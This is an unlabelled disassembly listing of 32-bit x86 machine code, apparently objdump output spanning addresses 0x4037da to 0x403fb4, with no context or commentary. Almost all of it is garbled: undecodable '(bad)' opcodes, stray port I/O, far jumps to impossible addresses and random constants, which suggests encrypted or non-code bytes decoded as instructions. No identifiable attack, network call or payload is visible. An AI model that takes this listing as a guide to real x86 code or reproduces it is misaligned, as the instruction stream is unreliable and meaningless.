  4037da:	ret    
  4037db:	aam    0xb3
  4037dd:	adc    al,0xd
  4037df:	push   0x94899bee
  4037e4:	mov    BYTE PTR [edi+0x5888030e],ah
  4037ea:	out    0xb2,al
  4037ec:	daa    
  4037ed:	shr    dh,cl
  4037ef:	not    DWORD PTR [ecx-0x5350c0fb]
  4037f5:	sbb    DWORD PTR [eax-0x77d245f5],esp
  4037fb:	sbb    esi,DWORD PTR [edx+0x50d8fca8]
  403801:	loop   0x4037a7
  403803:	adc    al,0x89
  403806:	or     BYTE PTR [ecx+0x25],ch
  403809:	lods   al,BYTE PTR ds:[esi]
  40380a:	loop   0x403887
  40380c:	inc    edx
  40380d:	mov    ds:0x7eb374e0,al
  403812:	inc    edi
  403813:	int3   
  403814:	aaa    
  403815:	nop
  403816:	cmp    eax,0xf1433196
  40381b:	sub    edx,DWORD PTR [eax+0x5232d56a]
  403821:	mov    bl,0xc7
  403823:	jmp    FWORD PTR [esi+0x13]
  403826:	inc    BYTE PTR [ebp-0x2d]
  403829:	push   0xffffffda
  40382b:	push   ecx
  40382c:	add    BYTE PTR [edx+0x5ffe8bb2],ah
  403832:	sbb    BYTE PTR [edx+0x228dcfba],cl
  403838:	sahf   
  403839:	push   ebx
  40383a:	loope  0x403809
  40383c:	and    BYTE PTR [esi+0xc],0xc
  403840:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403841:	js     0x40384a
  403843:	and    eax,0xb38de7a7
  403848:	stos   DWORD PTR es:[edi],eax
  403849:	sub    bl,bl
  40384b:	dec    esi
  40384c:	mov    ah,0x74
  40384e:	fdivr  st,st(6)
  403850:	inc    ecx
  403851:	mov    ah,0xd4
  403853:	jbe    0x403823
  403855:	out    0xe9,al
  403857:	loope  0x40386a
  403859:	cld    
  40385a:	ret    
  40385b:	retf   
  40385c:	fsub   st(6),st
  40385e:	loope  0x4038c1
  403860:	std    
  403861:	push   cs
  403862:	je     0x403883
  403864:	dec    eax
  403865:	and    al,0xc7
  403867:	loop   0x403897
  403869:	push   ss
  40386a:	stos   BYTE PTR es:[edi],al
  40386b:	aaa    
  40386c:	js     0x40383d
  40386e:	pop    edx
  40386f:	mov    al,0x44
  403871:	sbb    edi,ecx
  403873:	jbe    0x4038cc
  403875:	js     0x4038b8
  403877:	enter  0x8f63,0x66
  40387b:	jmp    0x6a6be78c
  403880:	or     DWORD PTR [edi],ebp
  403882:	retf   0xf051
  403885:	push   ebx
  403886:	pusha  
  403887:	sub    dh,ch
  403889:	adc    edx,DWORD PTR [ecx]
  40388b:	and    edx,DWORD PTR [edi-0x11da4648]
  403891:	dec    edi
  403892:	push   0x344f57c8
  403897:	dec    ebp
  403898:	loopne 0x4038b5
  40389a:	fidiv  WORD PTR [ecx]
  40389c:	sahf   
  40389d:	lods   eax,DWORD PTR ds:[esi]
  40389e:	enter  0xc262,0xe4
  4038a2:	inc    ebp
  4038a3:	(bad)  
  4038a4:	nop
  4038a5:	loopne 0x403904
  4038a7:	sbb    ah,BYTE PTR [ebp+0x64]
  4038aa:	sbb    BYTE PTR [esi+0x5c],ch
  4038ad:	mov    edi,0xf0544281
  4038b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038b3:	es pop edi
  4038b5:	or     dl,BYTE PTR [edi+eiz*8+0x4f8e01a7]
  4038bc:	jns    0x4038cb
  4038be:	scas   eax,DWORD PTR es:[edi]
  4038bf:	fimul  DWORD PTR [edx-0x6516f7fc]
  4038c5:	add    al,BYTE PTR [eax]
  4038c7:	add    dh,cl
  4038c9:	rol    esi,cl
  4038cb:	ror    ecx,0xd9
  4038ce:	(bad)  
  4038d0:	mov    ebp,0x24d405f3
  4038d5:	ret    
  4038d6:	out    dx,al
  4038d7:	mov    edi,0x78781d14
  4038dc:	(bad)  
  4038dd:	jle    0x403957
  4038df:	js     0x40391c
  4038e1:	dec    ebp
  4038e2:	push   eax
  4038e3:	jmp    0x7918a7b8
  4038e8:	lahf   
  4038e9:	jae    0x4038a7
  4038eb:	ret    
  4038ec:	dec    eax
  4038ed:	out    0x70,eax
  4038ef:	dec    ebp
  4038f0:	push   eax
  4038f1:	push   es
  4038f2:	cmp    edx,0x41a14996
  4038f8:	mov    al,0xc6
  4038fa:	es in  eax,0x96
  4038fd:	ss pop eax
  4038ff:	adc    eax,0x9cc41d8
  403904:	fdivr  DWORD PTR [ebp-0x32a31bc1]
  40390a:	loope  0x40396f
  40390c:	sbb    BYTE PTR [edx+0xc],ch
  40390f:	or     BYTE PTR [esi-0x4],ah
  403912:	(bad)  
  403913:	adc    DWORD PTR [ecx-0x3a],esp
  403916:	cmp    eax,0xe0b0a6b0
  40391b:	adc    ch,BYTE PTR [edx+0xb]
  40391e:	inc    edx
  40391f:	fs dec esp
  403921:	jg     0x4038d5
  403923:	icebp  
  403924:	push   0x9b2e937d
  403929:	sub    al,0x44
  40392b:	cmp    DWORD PTR [esi+0x4cbea74a],0x3c
  403932:	sbb    esp,DWORD PTR [edx+ecx*8+0x1125c5f]
  403939:	idiv   DWORD PTR [esi-0x26]
  40393c:	mov    ah,0x1
  40393e:	dec    edi
  40393f:	mov    WORD PTR [ebx],es
  403941:	jmp    0xcdf7360e
  403946:	jbe    0x403974
  403948:	push   ss
  403949:	pop    ds
  40394a:	adc    esp,DWORD PTR [ebx-0xe0dff21]
  403950:	sub    ebx,DWORD PTR [edi-0x5900d1e4]
  403956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403957:	les    edx,FWORD PTR [edi-0x1c5e33bb]
  40395d:	ins    BYTE PTR es:[edi],dx
  40395e:	dec    ebp
  40395f:	lods   eax,DWORD PTR ds:[esi]
  403960:	loopne 0x403964
  403962:	jl     0x4039b1
  403964:	sub    dl,BYTE PTR [edx]
  403966:	fisub  WORD PTR [esi-0x10fa53c8]
  40396c:	leave  
  40396d:	xor    DWORD PTR [esi-0x27575f52],0x6e
  403974:	push   esi
  403975:	and    eax,0x7cc388d5
  40397a:	frstor [edi]
  40397c:	ret    0x8f03
  40397f:	mov    gs,ebx
  403981:	aas    
  403982:	out    dx,al
  403983:	jmp    0xd1acc1c6
  403988:	adc    bh,BYTE PTR [ebp+0x76]
  40398b:	pop    ebp
  40398c:	out    0xd1,ax
  40398f:	imul   esi,DWORD PTR [esi+edx*8-0x5a],0xffffffa4
  403994:	std    
  403995:	pop    esi
  403996:	ficomp DWORD PTR [edi+0x7041a3fb]
  40399c:	ret    
  40399d:	mov    eax,ds:0x41f9785e
  4039a2:	fwait
  4039a3:	clc    
  4039a4:	sti    
  4039a5:	in     eax,dx
  4039a6:	jne    0x403993
  4039a8:	jle    0x4039df
  4039aa:	jle    0x4039c0
  4039ac:	mov    bl,0x90
  4039ae:	lods   eax,DWORD PTR ds:[esi]
  4039af:	push   0xf2424674
  4039b4:	stos   DWORD PTR es:[edi],eax
  4039b5:	jp     0x4039d5
  4039b7:	inc    ecx
  4039b8:	popa   
  4039b9:	push   esp
  4039ba:	push   ebp
  4039bb:	aad    0x87
  4039bd:	inc    ebp
  4039be:	mov    dh,0x77
  4039c0:	jb     0x403972
  4039c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039c3:	cld    
  4039c4:	cmp    al,0xe6
  4039c6:	scas   eax,DWORD PTR es:[edi]
  4039c7:	add    cl,BYTE PTR [eax-0x3043e2fc]
  4039cd:	dec    esp
  4039ce:	iret   
  4039cf:	xchg   ecx,eax
  4039d0:	xor    eax,DWORD PTR [eax-0x22995c68]
  4039d6:	int3   
  4039d7:	rcl    DWORD PTR [ebp+0x25d6dd7c],cl
  4039dd:	shl    BYTE PTR [ecx],cl
  4039df:	test   BYTE PTR [ecx-0x1d6ea9f7],dl
  4039e5:	stos   BYTE PTR es:[edi],al
  4039e6:	inc    ecx
  4039e7:	or     al,0x23
  4039e9:	and    BYTE PTR [edi+0x218dc957],dl
  4039ef:	test   BYTE PTR [ecx],bl
  4039f1:	push   cs
  4039f2:	stc    
  4039f3:	mov    eax,ds:0x41587a9d
  4039f8:	leave  
  4039f9:	inc    edi
  4039fa:	and    cl,BYTE PTR [edi+eiz*4]
  4039fd:	pop    edi
  4039fe:	add    al,0x36
  403a00:	push   edi
  403a01:	push   eax
  403a02:	jl     0x403a5d
  403a04:	mov    ebp,0x558ea36e
  403a09:	adc    eax,0x36132789
  403a0e:	call   0x3d2d:0xb4480d68
  403a15:	push   eax
  403a16:	das    
  403a17:	inc    eax
  403a18:	xchg   DWORD PTR [esi],edx
  403a1a:	jne    0x403a3a
  403a1c:	gs loope 0x4039d8
  403a1f:	js     0x403a80
  403a21:	cmc    
  403a22:	jg     0x403a78
  403a24:	push   edx
  403a25:	or     BYTE PTR [eax+eiz*4+0x5f90f585],al
  403a2c:	in     eax,dx
  403a2d:	mov    ch,0x48
  403a2f:	sbb    ch,ch
  403a31:	mov    ebx,0xd80a425d
  403a36:	rcl    DWORD PTR [ecx+0x5599657e],1
  403a3c:	pop    ebx
  403a3d:	(bad)  
  403a3e:	mov    dh,0x2c
  403a40:	dec    esp
  403a41:	jge    0x403a86
  403a43:	in     eax,0xba
  403a45:	in     al,dx
  403a46:	mov    ds:0xf51dc474,eax
  403a4b:	repz inc esi
  403a4d:	or     DWORD PTR [edx],0x28d7b03d
  403a53:	call   0xf4aafa70
  403a58:	pop    esi
  403a59:	push   eax
  403a5a:	lods   eax,DWORD PTR ds:[esi]
  403a5b:	lahf   
  403a5c:	sahf   
  403a5d:	outs   dx,BYTE PTR ds:[esi]
  403a5e:	dec    edx
  403a5f:	xchg   BYTE PTR [ebx+ebp*2-0x3c],bl
  403a63:	bound  edi,QWORD PTR [ecx-0x4bf3de73]
  403a69:	mov    ch,0x74
  403a6b:	pop    esi
  403a6c:	and    BYTE PTR [edx-0x33],0x32
  403a70:	in     al,dx
  403a71:	imul   eax,DWORD PTR [edi+eax*8-0x77639aa4],0xffffff84
  403a79:	stos   BYTE PTR es:[edi],al
  403a7a:	loopne 0x403a98
  403a7c:	repz mov cl,BYTE PTR [edi+0x39cf1fec]
  403a83:	jne    0x403a85
  403a85:	jae    0x403a57
  403a87:	inc    esp
  403a88:	jl     0x403aec
  403a8a:	repnz inc ebx
  403a8c:	jge    0x403abf
  403a8e:	ficomp WORD PTR [esi]
  403a90:	jne    0x403a2a
  403a92:	sub    ebx,DWORD PTR [edi]
  403a94:	sub    BYTE PTR [ebp+0x10fa01df],bh
  403a9a:	jl     0x403a82
  403a9c:	cmp    eax,edi
  403a9e:	inc    edx
  403a9f:	outs   dx,BYTE PTR ds:[esi]
  403aa0:	div    DWORD PTR [edx+ecx*4-0x21ea7d6d]
  403aa7:	cli    
  403aa8:	cmp    DWORD PTR [edx+eiz*2+0x1c3ee5e0],edx
  403aaf:	imul   edi,DWORD PTR [ebx-0x23dbf82a],0xffffffb7
  403ab6:	or     eax,0xd91b1830
  403abb:	mov    bh,0xe9
  403abd:	ins    DWORD PTR es:[edi],dx
  403abe:	pusha  
  403abf:	(bad)  
  403ac0:	push   ebx
  403ac1:	repnz dec ebx
  403ac3:	repnz add eax,0xed251571
  403ac9:	pop    ebp
  403aca:	pushf  
  403acb:	js     0x403ac7
  403acd:	pop    ebp
  403ace:	in     al,dx
  403acf:	mov    cs,esp
  403ad1:	in     al,dx
  403ad2:	fcom   QWORD PTR [ebx+0x55]
  403ad5:	jge    0x403b23
  403ad7:	xor    bl,BYTE PTR ds:0x76ab6432
  403add:	mov    bh,0x2
  403adf:	or     DWORD PTR [ebx-0x5a],esi
  403ae2:	push   ss
  403ae3:	jmp    FWORD PTR [eax+0x66]
  403ae6:	mov    DWORD PTR [edi+edi*1+0x6e],eax
  403aea:	repz xchg edi,eax
  403aec:	adc    BYTE PTR [ebx-0x4c],0xb7
  403af0:	lods   al,BYTE PTR ds:[esi]
  403af1:	out    dx,al
  403af2:	fild   WORD PTR [ebx-0xd5882fd]
  403af8:	test   BYTE PTR [esi],0x82
  403afb:	pop    ss
  403afc:	ja     0x403b77
  403afe:	pop    esp
  403aff:	push   esp
  403b00:	xchg   edi,eax
  403b01:	dec    ecx
  403b02:	cmp    BYTE PTR [ebx+edx*8+0x467a4495],0x90
  403b0a:	jp     0x403adf
  403b0c:	popa   
  403b0d:	std    
  403b0e:	pop    edx
  403b0f:	mov    eax,ds:0x5437869e
  403b14:	lods   eax,DWORD PTR ds:[esi]
  403b15:	pusha  
  403b16:	xchg   esi,eax
  403b17:	xchg   ebx,eax
  403b18:	cs push ds
  403b1a:	pop    ecx
  403b1b:	(bad)  
  403b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b1e:	and    al,0xef
  403b20:	mov    edx,DWORD PTR [ebx+0x32]
  403b23:	sti    
  403b24:	and    eax,0x2ca8e702
  403b29:	js     0x403b3d
  403b2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b2c:	paddd  mm3,mm4
  403b2f:	cdq    
  403b30:	push   ebp
  403b31:	pop    edi
  403b32:	cmp    BYTE PTR [ebx-0x442784c9],cl
  403b38:	xor    eax,0x9391e796
  403b3d:	ds dec esi
  403b3f:	je     0x403b03
  403b41:	std    
  403b42:	and    ebp,DWORD PTR gs:[eax]
  403b45:	(bad)  
  403b46:	jg     0x403bba
  403b48:	push   edx
  403b49:	ss gs pop esi
  403b4c:	adc    DWORD PTR [eax],esp
  403b4e:	out    dx,eax
  403b4f:	shl    DWORD PTR [eax-0x37a10889],0x83
  403b56:	mov    BYTE PTR [ebp+0x6e1b3966],dl
  403b5c:	jbe    0x403b1a
  403b5e:	sbb    al,0xe5
  403b60:	pop    ecx
  403b61:	mov    ecx,0x43343b04
  403b66:	cmp    al,0xc5
  403b68:	je     0x4040bd
  403b6e:	jmp    0x403e0d
  403b73:	leave  
  403b74:	rol    dl,cl
  403b76:	rcr    ecx,cl
  403b78:	rcr    ecx,cl
  403b7a:	(bad)  
  403b7c:	ss push edx
  403b7e:	fwait
  403b7f:	dec    ebx
  403b80:	ret    
  403b81:	pop    eax
  403b82:	adc    al,0x9a
  403b84:	and    edi,DWORD PTR [eax+0x78]
  403b87:	(bad)  
  403b88:	jle    0x403c02
  403b8a:	js     0x403bea
  403b8c:	fwait
  403b8d:	loop   0x403bc0
  403b8f:	retf   0xbf21
  403b92:	js     0x403b63
  403b94:	or     DWORD PTR ds:0xdf8c846d,ebx
  403b9a:	mov    ebx,0xe9561e88
  403b9f:	or     DWORD PTR [eax],0x5fd72d6a
  403ba5:	das    
  403ba6:	jecxz  0x403c00
  403ba8:	std    
  403ba9:	mov    edi,DWORD PTR [esi+0x5f561236]
  403baf:	sbb    eax,0xd26f2614
  403bb4:	mov    bh,0xd8
  403bb6:	or     dh,dh
  403bb8:	lods   eax,DWORD PTR ds:[esi]
  403bb9:	mov    edx,0xbd59e143
  403bbe:	int3   
  403bbf:	ret    0x8c34
  403bc2:	ret    0x18a9
  403bc5:	jnp    0x403c26
  403bc7:	sbb    al,BYTE PTR [esi+0x1dfa6dbc]
  403bcd:	fstp   DWORD PTR [ebx+0x46]
  403bd0:	sbb    DWORD PTR [esi+0x4e9701cb],ebp
  403bd6:	bound  edi,QWORD PTR ds:0xee107fe0
  403bdc:	fisttp DWORD PTR [esi]
  403bde:	shr    DWORD PTR [ebx-0x32e5a1f9],0x45
  403be5:	cmp    BYTE PTR [ebp-0x19],ch
  403be8:	jge    0x403baa
  403bea:	les    edx,FWORD PTR [ebx-0x3f5bd81a]
  403bf0:	inc    ebx
  403bf1:	pop    edi
  403bf2:	loopne 0x403bfe
  403bf4:	mov    eax,0xe715bc28
  403bf9:	and    esi,DWORD PTR [eax+ebp*4-0x1a6af67c]
  403c00:	out    0x47,eax
  403c02:	xor    al,0xe
  403c04:	xor    DWORD PTR [ecx-0x63],ebp
  403c07:	inc    ebp
  403c08:	daa    
  403c09:	mov    ebp,0xa1f7a383
  403c0e:	jmp    0x78d4f36e
  403c13:	sbb    eax,0x9bcc89bc
  403c18:	int3   
  403c19:	retf   
  403c1a:	js     0x403bd0
  403c1c:	in     eax,0x2
  403c1e:	mov    eax,0x1648556
  403c23:	xchg   ebp,eax
  403c24:	into   
  403c25:	xchg   ecx,eax
  403c26:	mov    ecx,0x925dc5bf
  403c2b:	xlat   BYTE PTR ds:[ebx]
  403c2c:	fwait
  403c2d:	pop    edi
  403c2e:	mov    ebp,0xbbfc8e19
  403c33:	jle    0x403bc0
  403c35:	jb     0x403c32
  403c37:	out    0x48,al
  403c39:	call   0xfd1574a9
  403c3e:	xchg   ecx,eax
  403c3f:	scas   al,BYTE PTR es:[edi]
  403c40:	sbb    eax,0x27f592f2
  403c45:	icebp  
  403c46:	xlat   BYTE PTR ds:[ebx]
  403c47:	jb     0x403c1e
  403c49:	mov    bh,0x4
  403c4b:	sbb    BYTE PTR [ebp-0x74],ch
  403c4e:	jo     0x403c55
  403c50:	sub    ch,BYTE PTR [edx]
  403c52:	sub    ebx,DWORD PTR [edi-0x33]
  403c55:	push   es
  403c56:	cmp    BYTE PTR [ebx+0x7826179e],ch
  403c5c:	sahf   
  403c5d:	repnz repz mov edx,0x2466b1bc
  403c64:	add    eax,0x6ede7668
  403c69:	nop
  403c6a:	mov    bl,0x7e
  403c6c:	xor    al,0x8a
  403c6e:	xchg   BYTE PTR [ebp-0x27],dh
  403c71:	in     al,0xe0
  403c73:	push   ecx
  403c74:	clc    
  403c75:	loope  0x403c79
  403c77:	jae    0x403c61
  403c79:	or     eax,0x32b993a3
  403c7e:	pop    ebx
  403c7f:	xchg   esi,eax
  403c80:	loop   0x403c4a
  403c82:	into   
  403c83:	add    eax,0xb593e489
  403c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c89:	shr    BYTE PTR [ecx],1
  403c8b:	sub    eax,0x7c7da717
  403c90:	lods   eax,DWORD PTR ds:[esi]
  403c91:	mov    ch,bh
  403c93:	int    0xe1
  403c95:	sub    al,BYTE PTR [ecx+0x4874a1a8]
  403c9b:	in     eax,0x2e
  403c9d:	jno    0x403c4e
  403c9f:	pop    DWORD PTR [ecx+ecx*8-0x61ccc177]
  403ca6:	and    al,0xa2
  403ca8:	in     eax,0x32
  403caa:	pushf  
  403cab:	nop
  403cac:	xlat   BYTE PTR ds:[ebx]
  403cad:	push   0x3291e94b
  403cb2:	pushf  
  403cb3:	jg     0x403c9b
  403cb5:	mov    ds:0xa568eed,al
  403cba:	mov    DWORD PTR [ebx+0x1c],edx
  403cbd:	push   cs
  403cbe:	lods   eax,DWORD PTR ds:[esi]
  403cbf:	cmp    edx,ebp
  403cc1:	js     0x403c6c
  403cc3:	pop    edx
  403cc4:	mov    eax,fs
  403cc6:	xchg   BYTE PTR [ebx-0x52],dh
  403cc9:	in     al,0x12
  403ccb:	cmp    eax,0x5e3f14fa
  403cd0:	retf   0xe63
  403cd3:	xchg   BYTE PTR [ecx-0x43b38493],ah
  403cd9:	push   esi
  403cda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cdb:	jg     0x403c92
  403cdd:	cmp    BYTE PTR [ecx+ecx*4-0x1e1138aa],0x6a
  403ce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ce6:	xor    dh,ah
  403ce8:	adc    ebp,esi
  403cea:	ins    DWORD PTR es:[edi],dx
  403ceb:	pop    DWORD PTR [esp+edx*1+0x3b]
  403cef:	xor    eax,0x5834cdc0
  403cf4:	ins    DWORD PTR es:[edi],dx
  403cf5:	loop   0x403cb6
  403cf7:	pop    esp
  403cf8:	rcr    al,cl
  403cfa:	mov    ch,BYTE PTR [ebp+0x2a]
  403cfd:	mov    bh,0x2
  403cff:	push   bx
  403d01:	data16 aam 0x43
  403d04:	xchg   esi,eax
  403d05:	mov    eax,DWORD PTR [edi+0x4358ca9d]
  403d0b:	imul   ebx,DWORD PTR [eax+0x21],0x542b29ca
  403d12:	lods   al,BYTE PTR ds:[esi]
  403d13:	mov    edi,DWORD PTR ds:0x2a24a5b3
  403d19:	fsubr  QWORD PTR [eax-0x70b5f7a0]
  403d1f:	test   BYTE PTR [ebx-0x1],al
  403d22:	cli    
  403d23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d24:	mov    ds:0x54b9a3d1,al
  403d29:	std    
  403d2a:	lods   al,BYTE PTR ds:[esi]
  403d2b:	sub    cl,BYTE PTR [ebx-0x66fb44a5]
  403d31:	xchg   edx,eax
  403d32:	inc    edx
  403d33:	dec    edi
  403d34:	xchg   esi,eax
  403d35:	daa    
  403d36:	add    esi,edi
  403d38:	sub    al,0x1
  403d3a:	in     eax,0x9
  403d3c:	sbb    eax,0x598ea9a2
  403d41:	scas   eax,DWORD PTR es:[edi]
  403d42:	pop    ebp
  403d43:	mov    BYTE PTR [eax-0xa2eff38],bl
  403d49:	push   esp
  403d4a:	pop    es
  403d4b:	(bad)  
  403d4c:	jne    0x403cf5
  403d4e:	jle    0x403dcd
  403d50:	dec    DWORD PTR [esi-0x3f00a879]
  403d56:	mov    WORD PTR [di+0x7fe5],gs
  403d5b:	les    ebx,FWORD PTR [ecx-0x1f]
  403d5e:	mov    al,0x1a
  403d60:	and    BYTE PTR [edi+edi*4+0x69],dl
  403d64:	push   eax
  403d65:	test   al,0x6e
  403d67:	int    0xe
  403d69:	sbb    dh,dl
  403d6b:	les    ebp,FWORD PTR ds:0xb356c6c9
  403d71:	sbb    DWORD PTR [ecx],eax
  403d73:	and    eax,0x189c5b96
  403d78:	mov    eax,ds:0xe32f048b
  403d7d:	xor    DWORD PTR ds:0xf4a22d84,esp
  403d83:	das    
  403d84:	retf   
  403d85:	mov    ch,0xfa
  403d87:	cld    
  403d88:	jb     0x403dd2
  403d8a:	shl    BYTE PTR [edi+0x14],cl
  403d8d:	arpl   WORD PTR ds:0xbd485eb9,sp
  403d93:	jns    0x403d19
  403d95:	lds    ebp,FWORD PTR [ebx]
  403d97:	dec    ebp
  403d98:	lods   al,BYTE PTR ds:[esi]
  403d99:	pusha  
  403d9a:	dec    ebx
  403d9b:	jae    0x403d8a
  403d9d:	imul   eax,DWORD PTR [eax+ebp*4],0x6
  403da1:	xor    al,0x15
  403da3:	push   0x4
  403da5:	mov    DWORD PTR [ebx-0x23],esi
  403da8:	js     0x403e1f
  403daa:	or     eax,0x745a144b
  403daf:	retf   
  403db0:	test   eax,0x842552f
  403db5:	xor    al,0x7c
  403db7:	je     0x403d5c
  403db9:	cmc    
  403dba:	pusha  
  403dbb:	add    ebx,DWORD PTR [edx+0xd7c212]
  403dc1:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dc3:	push   ss
  403dc4:	in     eax,0x14
  403dc6:	xchg   ebx,eax
  403dc7:	stc    
  403dc8:	es in  al,0x4e
  403dcb:	loop   0x403d9d
  403dcd:	sbb    DWORD PTR [esi+0x145a35fd],esi
  403dd3:	aas    
  403dd4:	cdq    
  403dd5:	loope  0x403d78
  403dd7:	aas    
  403dd8:	push   0x2ad2bb83
  403ddd:	mov    ch,0xa
  403ddf:	jecxz  0x403d61
  403de1:	iret   
  403de2:	xor    al,0x5e
  403de4:	pop    ss
  403de5:	cmp    al,0x4e
  403de7:	push   ss
  403de8:	pop    ecx
  403de9:	daa    
  403dea:	rcr    dl,0xef
  403ded:	add    BYTE PTR [ebp+0x28e9518d],ch
  403df3:	cli    
  403df4:	shl    DWORD PTR [ecx+0x2753c30c],cl
  403dfa:	push   0xd4fc7a5c
  403dff:	les    ebp,FWORD PTR [ebx+0x6d]
  403e02:	sbb    al,0xba
  403e04:	repz dec esi
  403e06:	jne    0x403e12
  403e08:	cs dec eax
  403e0a:	iret   
  403e0b:	ins    BYTE PTR es:[edi],dx
  403e0c:	push   eax
  403e0d:	mov    eax,DWORD PTR [ebp+0x8]
  403e10:	mov    ecx,DWORD PTR [ebp-0x8]
  403e13:	xor    eax,esi
  403e15:	add    eax,edi
  403e17:	mov    DWORD PTR [ecx],eax
  403e19:	jmp    0x404380
  403e1e:	jmp    0x4040bd
  403e23:	ds retf 0xcdca
  403e27:	retf   0xd9cd
  403e2a:	fldenv ds:0x23dd8593
  403e30:	jo     0x403dfb
  403e32:	mov    BYTE PTR [eax],bl
  403e34:	and    BYTE PTR [eax+0x78],bh
  403e37:	(bad)  
  403e38:	jle    0x403eb2
  403e3a:	js     0x403e46
  403e3c:	mov    ch,cl
  403e3e:	popa   
  403e3f:	xor    cl,BYTE PTR [esp+ecx*8]
  403e42:	jo     0x403e67
  403e44:	pop    ecx
  403e45:	push   eax
  403e46:	dec    ecx
  403e48:	sub    BYTE PTR [ebx+0x71e0e64e],dl
  403e4e:	push   0x8
  403e50:	cld    
  403e51:	xor    dl,BYTE PTR [edx]
  403e53:	clc    
  403e54:	dec    ecx
  403e55:	(bad)  
  403e57:	sbb    DWORD PTR [ebx-0x30],ebp
  403e5a:	idiv   DWORD PTR [ebx+edx*8]
  403e5d:	rcl    BYTE PTR [ebx],cl
  403e5f:	sub    eax,0x91b68654
  403e64:	push   cs
  403e65:	sbb    esi,DWORD PTR [edx-0x46fc681a]
  403e6b:	ret    
  403e6c:	aaa    
  403e6d:	popa   
  403e6e:	jmp    0x403ec3
  403e70:	cmp    edx,esi
  403e72:	and    eax,0xba64b954
  403e77:	or     DWORD PTR [edi-0x5b512e86],ecx
  403e7d:	push   esi
  403e7e:	jbe    0x403eb7
  403e80:	leave  
  403e81:	(bad)  
  403e83:	sub    ah,ah
  403e85:	test   eax,0x82375462
  403e8a:	mov    al,BYTE PTR [ebp+0x16]
  403e8d:	inc    eax
  403e8e:	mov    ah,0x86
  403e90:	inc    eax
  403e91:	and    DWORD PTR [eax+0xa4275f4],ecx
  403e97:	ret    0xe6c2
  403e9a:	leave  
  403e9b:	inc    edi
  403e9c:	mov    ebp,edx
  403e9e:	and    ah,BYTE PTR [esi]
  403ea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ea1:	push   ebp
  403ea2:	push   esp
  403ea3:	xor    eax,0x75a90691
  403ea8:	sbb    al,0xc2
  403eaa:	xchg   eax,ebx
  403eac:	and    eax,esp
  403eae:	push   ebp
  403eaf:	retf   0xc870
  403eb2:	repz jbe 0x403f14
  403eb5:	enter  0x71c3,0xc
  403eb9:	mov    DWORD PTR [edi-0x6d],edx
  403ebc:	push   esi
  403ebd:	add    esp,DWORD PTR [edx-0x1f]
  403ec0:	retf   0xb097
  403ec3:	cmp    bh,dl
  403ec5:	rcr    ebp,1
  403ec7:	(bad)  
  403ec8:	cli    
  403ec9:	repz leave 
  403ecb:	pop    eax
  403ecc:	mov    esi,0x721579f6
  403ed1:	imul   edx,ecx,0x3a8f7659
  403ed7:	or     BYTE PTR cs:[edx],0xf7
  403edb:	aad    0xe3
  403edd:	call   0xaaefa402
  403ee2:	aad    0xee
  403ee4:	cwde   
  403ee5:	dec    edx
  403ee6:	sbb    dl,BYTE PTR [edx]
  403ee8:	out    dx,al
  403ee9:	mov    bh,BYTE PTR [ebx-0x7a]
  403eec:	xchg   DWORD PTR [ebp-0x66],eax
  403eef:	xchg   ecx,eax
  403ef0:	mov    esi,0x59507a33
  403ef5:	test   DWORD PTR [esi],edx
  403ef7:	mov    BYTE PTR [esi],ah
  403ef9:	inc    ecx
  403efa:	push   ss
  403efb:	enter  0x5d26,0x7f
  403eff:	mov    dl,0x5e
  403f01:	push   ebp
  403f02:	pop    ss
  403f03:	jmp    0xd666:0x57919ef3
  403f0a:	jmp    0x7b82:0xffb8e415
  403f11:	hlt    
  403f12:	mov    gs,edi
  403f14:	imul   esp,DWORD PTR ds:0x908e5636,0x1a
  403f1b:	daa    
  403f1c:	cwde   
  403f1d:	mov    ch,0x6
  403f1f:	pop    ss
  403f20:	add    al,0x7e
  403f22:	clc    
  403f23:	pop    edx
  403f24:	add    bh,BYTE PTR [ebp+0x5f36e403]
  403f2a:	pop    ecx
  403f2b:	dec    ebx
  403f2c:	xchg   ebx,eax
  403f2d:	in     eax,0x5c
  403f2f:	or     al,0x83
  403f31:	shl    BYTE PTR [eax-0x5d],cl
  403f34:	and    al,bl
  403f36:	rcl    BYTE PTR [esi],cl
  403f38:	call   0x8cc6:0x5b169bff
  403f3f:	pop    ds
  403f40:	sbb    eax,0xb1a9a4c6
  403f45:	pop    ss
  403f46:	push   esp
  403f47:	loope  0x403ee2
  403f49:	mov    ebp,0x81a8412d
  403f4e:	inc    ecx
  403f4f:	add    cl,dh
  403f51:	push   edi
  403f52:	fld    DWORD PTR [eax+0xe]
  403f55:	mov    edi,0x8a9b4db8
  403f5a:	rcl    BYTE PTR [ecx-0x38f1160c],1
  403f60:	mov    eax,0x4e868a3
  403f65:	sbb    DWORD PTR [ebx*8-0x793f7d60],edx
  403f6c:	call   0x489b46b4
  403f71:	push   ss
  403f72:	adc    eax,esp
  403f74:	push   esi
  403f75:	mov    ebp,0x5d77f2ec
  403f7a:	add    DWORD PTR [ebp+0x45],edx
  403f7d:	mov    ah,dl
  403f7f:	stos   BYTE PTR es:[edi],al
  403f80:	sbb    edi,DWORD PTR [ecx+0x2e]
  403f83:	push   0xd75a55d6
  403f88:	popa   
  403f89:	xor    BYTE PTR [esp+ebp*8-0x50],bh
  403f8d:	call   0x2b8c:0x8b18e82c
  403f94:	add    eax,0xc3b7f713
  403f99:	sbb    eax,0xafb63905
  403f9e:	test   al,0x89
  403fa0:	lds    ecx,FWORD PTR [ecx+edi*1+0x38]
  403fa4:	adc    bh,BYTE PTR [ebx]
  403fa6:	(bad)  
  403fa8:	sub    eax,ebp
  403faa:	addr16 jmp 0x5a601e1
  403fb0:	inc    ecx
  403fb1:	adc    dl,BYTE PTR [edx-0x30]
  403fb4:	mov    edi,0x6a0914f2
